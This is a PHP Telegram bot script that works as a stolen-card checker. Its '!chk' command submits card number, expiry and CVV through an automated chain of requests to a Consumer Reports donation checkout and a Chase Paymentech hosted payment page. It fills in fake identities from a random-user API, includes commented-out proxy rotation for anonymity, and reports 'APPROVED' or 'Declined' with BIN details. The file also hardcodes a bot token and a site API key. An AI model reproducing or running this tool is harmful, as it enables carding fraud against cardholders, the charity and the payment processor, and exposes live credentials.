<?php

////////////////=============[Made with ?? by AndryMata]===============////////////////

///https://api.telegram.org/bot<token>/setwebhook?url=<url>

$botToken = "1671700440:AAGYiFAdxocte6eAUMxoHWQKxxtwTv52GT8"; // Enter ur bot token
$website = "https://api.telegram.org/bot".$botToken;
error_reporting(0);
$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
$chatId = $update["message"]["chat"]["id"];
$gId = $update["message"]["from"]["id"];
$userId = $update["message"]["from"]["id"];
$firstname = $update["message"]["from"]["first_name"];
$username = $update["message"]["from"]["username"];
$message = $update["message"]["text"];
$message_id = $update["message"]["message_id"];

//////////=========[Start Command]=========//////////

if ((strpos($message, "!start") === 0)||(strpos($message, "/start") === 0)){
sendMessage($chatId, "<b>Hello there!!%0AType /cmds to know all my commands!!%0A%0ABot Made by Dragon</b>");
}

//////////=========[Cmds Command]=========//////////

elseif ((strpos($message, "!cmds") === 0)||(strpos($message, "/cmds") === 0)){
sendMessage($chatId, "<u>Bin lookup:</u> <code>!bin</code> xxxxxx%0A<u>SK Key Check:</u> <code>!sk</code> sk_live%0A<u> To know ur info%0A%0A<b>Bot Made by Aamir </b>");
}

//////////=========[Info Command]=========//////////

elseif ((strpos($message, "!info") === 0)||(strpos($message, "/info") === 0)){
sendMessage($chatId, "<u>ID:</u> <code>$userId</code>%0A<u>First Name:</u> $firstname%0A<u>Username:</u> @$username%0A%0A<b>Bot Made by Dragon </b>");
}




//////////=========[Chk Command]=========//////////

if ((strpos($message, "!chk") === 0)||(strpos($message, "/chk") === 0)){
$lista = substr($message, 5);
$i     = explode("|", $lista);
$cc    = $i[0];
$mes   = $i[1];
$ano  = $i[2];
$ano1 = substr($yyyy, 2, 4);
$cvv   = $i[3];
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');
if ($_SERVER['REQUEST_METHOD'] == "POST"){
extract($_POST);
}
elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
extract($_GET);
}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

///////////////////////////////////////////////////////////////////////////////////////////////////////////////


///////////////////////////////////////////////////////////////////////////////////////////////////////////////

////////////////////////////===[Randomizing Details 


///////////////////////////////////////////////////////////////////////////////////////////////////////////////

///////////////=[1st REQ]=/////////////////

////////////////////////////===[Randomizing Details Api]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];
$serve_arr = array("gmail.com","homtail.com","yahoo.com","aol.com","comcast.net","outlook.com","msn.com","live.com","icloud.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);


////////////////////////////===[For Verify email]

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://ecq-ecommerce-api-1.consumerreports.org/api/emails/verify');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: ecq-ecommerce-api-1.consumerreports.org',
'accept: application/json, text/plain, */*',
'content-type: application/json',
'origin: https://donate.consumerreports.org',
'referer: https://donate.consumerreports.org/donation/639/Default-2020',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'x-api-key: UxzH4fbGbJ3HtE3vxG7Ds8LhIVLWhje35M7TfOTE',
'user-agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"email":"'.$email.'"}');

 $result = curl_exec($ch);
 ///echo $result;

////////////////////////////===[For anonymous]

$ch = curl_init();
//////////======= LUMINATI
///curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password"); Uncomment while using Zones
//////////======= Socks Proxy
//////////curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://ecq-ecommerce-api-1.consumerreports.org/api/authentication/anonymous');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: ecq-ecommerce-api-1.consumerreports.org',
'accept: application/json, text/plain, */*',
'origin: https://donate.consumerreports.org',
'referer: https://donate.consumerreports.org/donation/639/Default-2020',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'x-api-key: UxzH4fbGbJ3HtE3vxG7Ds8LhIVLWhje35M7TfOTE',
'user-agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '');

 $result = curl_exec($ch);
 $tok = trim(strip_tags(getStr($result,'"sessionToken":"','"')));
///echo $result;
///////echo $tok;

////////////////////////////======[For carts]

$ch = curl_init();
//////////======= LUMINATI
///curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password"); Uncomment while using Zones
//////////======= Socks Proxy
//////////curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://ecq-ecommerce-api-1.consumerreports.org/api/carts');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: ecq-ecommerce-api-1.consumerreports.org',
'accept: application/json, text/plain, */*',
'content-type: application/json',
'origin: https://donate.consumerreports.org',
'referer: https://donate.consumerreports.org/donation/639/Default-2020',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'x-api-key: UxzH4fbGbJ3HtE3vxG7Ds8LhIVLWhje35M7TfOTE',
'sessiontoken: '.$tok.'',
'user-agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"cartItemCommands":[{"quantity":1,"sku":"DONATION-VARIABLE-AMT-NR","amountOverride":1}],"donationSpec":{"id":"639","revision":779}}');

 $result2 = curl_exec($ch);
 $token = trim(strip_tags(getStr($result2,'"id":"','"')));
///////echo $result;
///////echo $token;

////////////////////////////=========[For initialization]

$ch = curl_init();
//////////======= LUMINATI
///curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password"); Uncomment while using Zones
//////////======= Socks Proxy
//////////curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://ecq-ecommerce-api-1.consumerreports.org/api/carts/'.$token.'/financial-instruments/credit-card/initialization');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: ecq-ecommerce-api-1.consumerreports.org',
'accept: application/json, text/plain, */*',
'content-type: application/json',
'origin: https://donate.consumerreports.org',
'referer: https://donate.consumerreports.org/donation/639/default-2020/payment/credit-card',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'sessiontoken: '.$tok.'',
'x-api-key: UxzH4fbGbJ3HtE3vxG7Ds8LhIVLWhje35M7TfOTE',
'user-agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"cssUrl":"https://donate.consumerreports.org/assets/css/hpfCreditCardCallback.0635dd98.css","callbackUrl":"https://donate.consumerreports.org/assets/html/hpf_callback_1_64_chase.html"}');

 $result3 = curl_exec($ch);
 $token1 = trim(strip_tags(getStr($result3,'"uid":"','"')));
//////// echo $token1;
 
 ////////////////////////////===[For output]
 
#=====================================================================================================#
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.chasepaymentechhostedpay.com/hpf/1_1/?output=embed&uID='.$token1.'');
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, true);
//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER,true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 120);
curl_setopt($ch, CURLOPT_TIMEOUT, 120);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'Host: www.chasepaymentechhostedpay.com',
  'Referer: https://donate.consumerreports.org/donation/639/default-2020/payment/credit-card',
  'sec-fetch-dest: iframe',
  'sec-fetch-mode: navigate',
  'sec-fetch-site: cross-site',
  'user-agent:  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 OPR/67.0.3575.115'
));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'output=embed&uID='.$token1.'');
$result4 = curl_exec($ch);
$dom = new DOMDocument;
$dom->loadHTML($result4);
$tags = $dom->getElementsByTagName('input');
for($i = 0; $i < $tags->length; $i ++){
	$grab = $tags->item($i);
	if($grab->getAttribute('name')=== 'sid'){
		$token7 = $grab->getAttribute('value');
	}
}	
///////echo $token7;

////////////////////////////===[For Authorizing Cards]

$ch = curl_init();
//////////======= LUMINATI
///curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password"); Uncomment while using Zones
//////////======= Socks Proxy
//////////curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://www.chasepaymentechhostedpay.com/hpf/1_1/iframeprocessor.php');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Accept: */*',
'Content-type: application/x-www-form-urlencoded',
'Host: www.chasepaymentechhostedpay.com',
'Origin: https://www.chasepaymentechhostedpay.com',
'Referer: https://www.chasepaymentechhostedpay.com/hpf/1_1/?output=embed&uID='.$token1.'',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=init&sid='.$token7.'');

 $result5 = curl_exec($ch);
 $token10 = trim(strip_tags(getStr($result5,'"tracer":"','"')));
/////echo $result5;
/////echo $token;


//////2req 
$ch = curl_init();
/////curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
/////curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password"); 
//////////======= Socks Proxy
/////////////curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://www.chasepaymentechhostedpay.com/hpf/1_1/iframeprocessor.php');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Accept: */*',
'Connection: keep-alive',
'Content-type: application/x-www-form-urlencoded',
'Host: www.chasepaymentechhostedpay.com',
'Origin: https://www.chasepaymentechhostedpay.com',
'Referer: https://www.chasepaymentechhostedpay.com/hpf/1_1/?output=embed&uID='.$token1.'',
'Sec-Fetch-Dest: empty',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Site: same-origin',
'User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36',
  ));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'sessionId=cea1844b-f368-4e09-8ab3-06a7a4b8dd02&amount=2.00&required=minimum&uIDTrans=1&tdsApproved=&tracer='.$token10.'&completeStatus=0&sid='.$token7.'&currency_code=USD&cbOverride=1&name=&ccType=Mastercard&ccNumber='.$cc.'&CVV2='.$cvv.'&expMonth='.$mes.'&expYear='.$ano.'&action=process&sid='.$token7.'');

   $result6 = curl_exec($ch);
   $message = trim(strip_tags(getStr($result6,'"cvv_result":{"code":"','"')));
   $avs = trim(strip_tags(getStr($result6,'"avs_result":{"code":"','"')));
  
///////echo $result6;

////////////////////////////===[For Authorizing Cards]

$ch = curl_init();
//////////======= LUMINATI
///curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password"); Uncomment while using Zones
//////////======= Socks Proxy
//////////curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://ecq-ecommerce-api-1.consumerreports.org/api/carts/'.$token.'/checkout/hpf');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: ecq-ecommerce-api-1.consumerreports.org',
'accept: application/json, text/plain, */*',
'content-type: application/json',
'origin: https://donate.consumerreports.org',
'referer: https://donate.consumerreports.org/donation/639/default-2020/payment/credit-card',
'sessiontoken: '.$tok.'',
'x-api-key: UxzH4fbGbJ3HtE3vxG7Ds8LhIVLWhje35M7TfOTE',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'Upgrade-Insecure-Requests: 1',
'user-agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"customer":{"address":{"streetAddress":"'.$street.'","extStreet":"","zipCode":"89135","state":"NV","city":"Las Vegas","country":"US"},"email":"'.$email.'","firstName":"'.$name.'","lastName":"'.$last.'"},"uid":"'.$token1.'","sourceSystem":"EC_DONATION_FLOW_ORDER"}');

 $result7 = curl_exec($ch);
//////////$fim = json_decode($result7,true);
////////print_r($fim);
///////////$time = $fim['timestamp'];
$status0 = trim(strip_tags(getStr($result7,'"prettyPrint":"','"')));
$status1 = trim(strip_tags(getStr($result7,'"errors":["The purchase failed: ','"')));
$status2 = trim(strip_tags(getStr($result7,'"errors":["Paymentech responded with an error: ','"')));

$cctwo = substr("$cc", 0, 6);

$gett = file_get_contents('https://bins-su-api.now.sh/api/'.$cctwo.'');
preg_match_all("(\"bin\":\"(.*)\")siU", $gett, $matches1);
$bin = $matches1[1][0];
preg_match_all("(\"vendor\":\"(.*)\")siU", $gett, $matches1);
$vendor = $matches1[1][0];
preg_match_all("(\"type\":\"(.*)\")siU", $gett, $matches1);
$type = $matches1[1][0];
preg_match_all("(\"level\":\"(.*)\")siU", $gett, $matches1);
$level = $matches1[1][0];
preg_match_all("(\"country\":\"(.*)\")siU", $gett, $matches1);
$country = $matches1[1][0];
preg_match_all("(\"bank\":\"(.*)\")siU", $gett, $matches1);
$bank = $matches1[1][0];
//////////////////////////////////////////////////////////////////////////////////////////////////////////////

if(strpos($result7, '$1.00')) {
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>APPROVED</b>%0A<u>RESPONSE:</u> <b>[Success '.$status0.' Charged]</b><u>Bin: '.$vendor.' • '.$type.' • '.$level.' • '.$bank.' • '.$country.'</u> <b>Convergepay</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by Dragon</b>');
}else{
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>Declined</b>%0A<u>RESPONSE:</u> <b>'.$status1.' '.$status2.'%0A<u></u><b>Bin: '.$vendor.' • '.$type.' • '.$level.' • '.$bank.' • '.$country.'</b>%0A</b><u>Gateway:</u> <b></b>%0A<u>Checked By:</u> @'.$username.'<u>%0A</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by Dragon</b>');
}
curl_close($ch);
}


$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
$chatId = $update["message"]["chat"]["id"];
$gId = $update["message"]["from"]["id"];
$userId = $update["message"]["from"]["id"];
$firstname = $update["message"]["from"]["first_name"];
$username = $update["message"]["from"]["username"];
$message = $update["message"]["text"];
$message_id = $update["message"]["message_id"];




////////////////////////////////////////////////////////////////////////////////////////////////

function sendMessage ($chatId, $message){
$url = $GLOBALS[website]."/sendMessage?chat_id=".$chatId."&text=".$message."&reply_to_message_id=".$message_id."&parse_mode=HTML";
file_get_contents($url);      
}

////////////////=============[Andry Mata]===============////////////////
////////==========[Used api raw bot of @Zeltraxrockzzz]============////////

?>
